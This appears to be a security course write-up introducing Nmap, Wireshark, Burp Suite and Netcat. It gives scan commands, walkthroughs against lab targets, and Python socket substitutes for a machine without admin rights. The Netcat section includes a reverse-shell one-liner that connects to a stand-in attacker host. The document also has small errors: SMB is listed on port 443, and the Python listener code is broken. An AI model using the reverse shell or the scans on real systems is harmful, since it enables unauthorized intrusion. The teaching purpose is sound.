# Task 1 — Tool Familiarization

The four tools the brief names: what each does, the features you will actually
use, a realistic first session, and — because this machine cannot run any of
them natively — an honest account of what is and is not available here, with
the exact substitute that was implemented instead, and the exact install
commands for once administrator rights exist.

---

## 1. Nmap — network mapper and scanner

**What it does:** probes hosts and reports what is reachable, which TCP/UDP
ports are open, what services and versions answer on them, what OS the stack
behaviour suggests, and what default scripts (NSE) can learn from those
services. It is the reconnaissance backbone of Tasks 2 and 4.

### Five most useful commands

```sh
nmap -sn 192.168.56.0/24                 # ping sweep: which hosts are alive (no port scan)
nmap -sV -sC -oA lab-scan 192.168.56.101 # service versions + default scripts; save all formats
nmap -p- -T4 192.168.56.101              # all 65535 TCP ports, aggressive timing
nmap -sS -Pn 192.168.56.101              # SYN "stealth" scan — needs raw sockets, i.e. root/admin
nmap --script vuln 192.168.56.101        # NSE vulnerability scripts (safe category by default)
```

Also worth knowing: `-O` for OS detection, `-oA name` to save normal, grepable
and XML output at once, `-T4` for timing on lab networks, `-Pn` when ICMP is
blocked (assume up, scan anyway), and `--open` to suppress closed-port noise.

**First-use walkthrough (once the lab VMs exist):**

```sh
# 1. Find the targets on the host-only network
nmap -sn 192.168.56.0/24
# 2. Full scan of the metasploitable host, with output saved
nmap -sV -sC -oA metasploitable-scan 192.168.56.101
# 3. Read the report
less metasploitable-scan.nmap
```

**What to look for in the output:** the `open` ports list is your attack
surface — on Metasploitable2 expect a deliberately awful inventory (FTP 21 with
anonymous login, Telnet 23, SSH 22, HTTP 80, SMTP 25, SMB 139/443, MySQL 3306,
VNC 5900). In the `-sV` columns, exact versions (`vsftpd 2.3.4`) map directly
to exploit-db entries; `ssl-cert` script output shows expiry and names;
`http-enum` reveals hidden paths. Anything you cannot attribute to a known
service is worth a manual `nc` banner grab.

---

## 2. Wireshark — packet analyser

**What it does:** captures packets off a network interface and decodes every
layer, letting you follow TCP streams, inspect TLS handshakes, read plaintext
protocols, and filter millions of frames down to the few that matter. It is
the tool that makes the OSI model visible.

### Five most useful features

1. **Capture setup** — pick the interface (on a lab VM: the host-only adapter),
   optionally a capture filter (`tcp port 80`, BPF syntax, applied at capture
   time), start capture.
2. **Display filters** — the real power, applied after capture:
   `http.request.method == "POST"`, `tcp.port == 22 and tcp.flags.syn == 1`,
   `dns.qry.name contains "bank"`, `tls.handshake.type == 1` (ClientHello),
   `ip.addr == 192.168.56.101`.
3. **Follow → TCP/HTTP stream** — reassembles a conversation into readable
   text, including the HTTP request and response bodies.
4. **Statistics → Conversations / Protocol Hierarchy** — volume by endpoint or
   protocol; the fastest way to spot an exfiltration or a beacon.
5. **Export objects → HTTP** — carve files transferred over HTTP out of the
   capture (malware samples, documents) without re-downloading them.

**First-use walkthrough (once Npcap and a lab network exist):**

```sh
# On the Kali VM: start Wireshark on the host-only interface, then:
nmap -sS 192.168.56.101          # in a terminal — the scan to observe
# In Wireshark: display filter  tcp.flags.syn == 1 and tcp.flags.ack == 0
#   -> the SYN packets of the scan; the SYN/ACK replies mark open ports.
# Then: capture ping + DNS:
ping -c 3 192.168.56.101
dig example.com
# Filter  dns or icmp  and read the packets layer by layer in the detail pane.
```

**What to look for:** which MAC addresses are talking (layer 2 — ARP spoofing
shows here as duplicate MACs for one IP); the TCP handshake and any RST
floods; DNS queries in cleartext including tunnelling candidates (long labels,
TXT-heavy traffic); unencrypted credentials in FTP/SMTP/HTTP Basic; the TLS
`ClientHello` SNI revealing which site was visited; retransmissions and
zero-window events that indicate a broken or attacked connection.

---

## 3. Burp Suite — web application proxy

**What it does:** sits between your browser and the target site (as an HTTP
proxy on 127.0.0.1:8080), intercepts every request and response for editing
and replay, and adds tooling around that: a site map, an active scanner
(Creator/Pro), Intruder for scripted parameter attacks, Decoder for
encoding round-trips. It is the standard workhorse for the Task 3 web attacks.

### Five most useful features

1. **Proxy → Intercept** — pause a request mid-flight and edit it: change
   `role=user` to `role=admin`, tamper a cookie, replay with a different
   session ID. This is the manual core of authorization testing.
2. **HTTP history / Sitemap** — every request the browser made, filterable;
   the fastest route to undiscovered endpoints (`/admin`, `/api/v2`).
3. **Repeater** — take any historical request and re-send it many times with
   small edits; essential for SQLi boolean probing and CSRF token analysis.
4. **Intruder** — position a payload list into a request (password list,
   IDOR enumeration, fuzzed filenames) and run it; positions, payloads and
   rate control are all configurable.
5. **Decoder** — base64/URL/hex/HTML encoding one click away, because every
   web attack eventually involves decoding a token or a cookie.

**First-use walkthrough (when the tool is installed):**

```
1. Launch Burp, create a project, keep the default proxy 127.0.0.1:8080.
2. Configure the browser: proxy 127.0.0.1:8080 (or FoxyProxy with a profile).
3. Visit http://127.0.0.1:8091 (the Task 3 vulnerable app). Burp's first-run
   CA certificate prompt appears; export the CA from
   Proxy -> Options and import it into the browser's trust store so HTTPS
   interception works.
4. Turn Intercept on, log in through the browser, watch the POST
   /login request arrive; forward it, observe the response and Set-Cookie.
5. Right-click the login request -> Send to Repeater; modify the credentials,
   replay, compare responses. Send a second request to Repeater with the
   session cookie to test whether authorization is enforced.
```

**What to look for:** cookies missing `HttpOnly`/`Secure`/`SameSite`; CSRF
tokens absent or static across sessions; 200 responses that differ only in
content length when you change an ID parameter (IDOR); server errors leaking
stack traces on malformed input; identical timing for valid and invalid
logins (no rate limiting).

---

## 4. Netcat — the TCP/UDP swiss army knife

**What it does:** reads and writes raw bytes over TCP or UDP, with or without
a listener. Banner grabbing, port checking, file transfer, simple relays, and
reverse/bind shell exercises — every one of those is "a socket with a command
line".

### Five most useful invocations

```sh
nc -zv 192.168.56.101 1-1024          # port check only, verbose; no data sent
echo -n "" | nc -w 3 192.168.56.101 21   # grab an FTP banner: "220 vsftpd 2.3.4"
nc -lvnp 4444                         # listen on 4444, numeric output, no DNS
nc -lvnp 4444 < file.tar.gz           # sender side of a file transfer
nc target 4444 > file.tar.gz          # receiver side
nc -u -lvnp 5353                      # same, over UDP (watch for timeouts: UDP is connectionless)
```

Reverse-shell context (Task 4 lab, against machines you own only):
`bash -i >& /dev/tcp/attacker/4444 0>&1` is the payload netcat listeners
commonly catch. Treat every listening netcat as an unauthenticated command
channel — which is exactly why it is also a useful detection target.

**First-use walkthrough (against your own lab host):**

```sh
# Terminal A (attacker)
nc -lvnp 4444
# Terminal B (target, same host-only network)
echo "hello from target" | nc -w 2 192.168.56.10 4444
# Terminal A now shows the string and the connection line:
#   connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 49822
# The source port in that line is itself reconnaissance data.
```

**What to look for:** banner strings (version disclosure — `SSH-2.0-OpenSSH_8.2p1`
is a version finding in itself); the difference between a refused connection
(RST, nothing listening) and a timeout (filtered by a firewall — different
security posture); silent UDP ports that still reply to malformed input.

---

## 5. Not available on this machine

The brief's lab expects these tools on a Kali VM. This host cannot run them,
and no fabricated substitutes are presented as if they were the real tools.
What follows is the honest mapping: tool, status here, the exact substitute
that exists in this repository, and the command that installs the real tool
once administrator rights are available.

| Tool | Status here | Substitute actually implemented | Install command for later (elevation required) |
|---|---|---|---|
| **Nmap** | Not installed (`Get-Command nmap` finds nothing). SYN stealth scan additionally impossible: raw TCP sockets are denied with `WinError 10013` for unprivileged processes (verified this session: `SOCK_RAW` + `IPPROTO_TCP` raises `PermissionError: [WinError 10013]`; an ICMP raw socket *can* be created, but that does not help craft TCP SYNs) | `task-2/scripts/portscan.py` — real TCP connect scan (`connect()` to each port, full handshake) plus banner grabbing by reading the service's first response. Connect scans are noisier than SYN scans (every probe completes a handshake and shows in server logs), which is the honest trade | `winget install Insecure.Nmap` (the installer offers Npcap; run an elevated shell). Or download the installer from nmap.org |
| **Wireshark** | Not possible. Capture on Windows requires the Npcap driver; the driver is absent (`Test-Path $env:SystemRoot\System32\drivers\npcap.sys` → False) and its installer needs administrator rights | **Not substitutable — stated plainly.** Packet capture cannot be done from this session, and no workaround is invented. Protocol-level work here uses application-layer tools only (Python sockets, curl, Resolve-DnsName) | `winget install WiresharkFoundation.Wireshark` in an elevated shell (installs Npcap; choose the Npcap option in the wizard) |
| **Burp Suite** | Not installed, and the GUI interception workflow is unavailable in this session: no Java runtime on the PATH (`Get-Command java` → nothing), which Burp requires | `task-3/scripts/` — intercept-and-replay done programmatically with Python `requests`: the scripts capture a real request/response pair from the local vulnerable app, replay it with modified parameters (SQLi payloads, cookie tampering, CSRF-token analysis), and compare responses. Same operations as Proxy + Repeater, without the GUI | Install a JRE, then Burp: `winget install EclipseAdoptium.Temurin.21.JRE`, then download the Community Edition installer from portswigger.net/burp/communitydownload (runs as a normal user; no elevation needed for the app itself once Java is present) |
| **Netcat** | Not installed (`Get-Command nc,ncat` → nothing) | Python socket one-liners, e.g. listener and connect: see below | Netcat ships with Nmap as `ncat.exe`: `winget install Insecure.Nmap` then use `ncat` in place of `nc` |

### Netcat stand-ins, in Python (runnable here today)

These are real code, not analogies — each opens an actual socket.

```powershell
# Listener: netcat -lvnp 4444 equivalent
python -c "import socket; s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1); s.bind(('0.0.0.0',4444)); s.listen(1); c,_=s.accept(); print('from',_.getpeername()); print(c.recv(4096).decode()); c.close()"

# Sender: echo hello | python ... to 127.0.0.1:4444 equivalent
python -c "import socket; s=socket.socket(); s.connect(('127.0.0.1',4444)); s.sendall(b'hello from python\n'); s.close()"

# Banner grab: echo | nc host 21 equivalent (connect, read, close)
python -c "import socket; s=socket.create_connection(('127.0.0.1',80), 3); s.sendall(b'HEAD / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n'); print(s.recv(4096).decode(errors='replace'))"

# Port check: nc -zv host port equivalent
python -c "import socket; s=socket.socket(); s.settimeout(1); print('open' if s.connect_ex(('127.0.0.1',80))==0 else 'closed')"
```

### When the lab exists: the same exercises with the real tools

The walkthroughs in sections 1–4 are written so they can be executed verbatim
on the future Kali VM against Metasploitable2/DVWA on the host-only network.
No step in them requires anything this machine cannot eventually provide — only
administrator rights to build the virtual lab in the first place. The exact
sequence for doing that is in `../lab/LAB-SETUP-REPORT.md`.
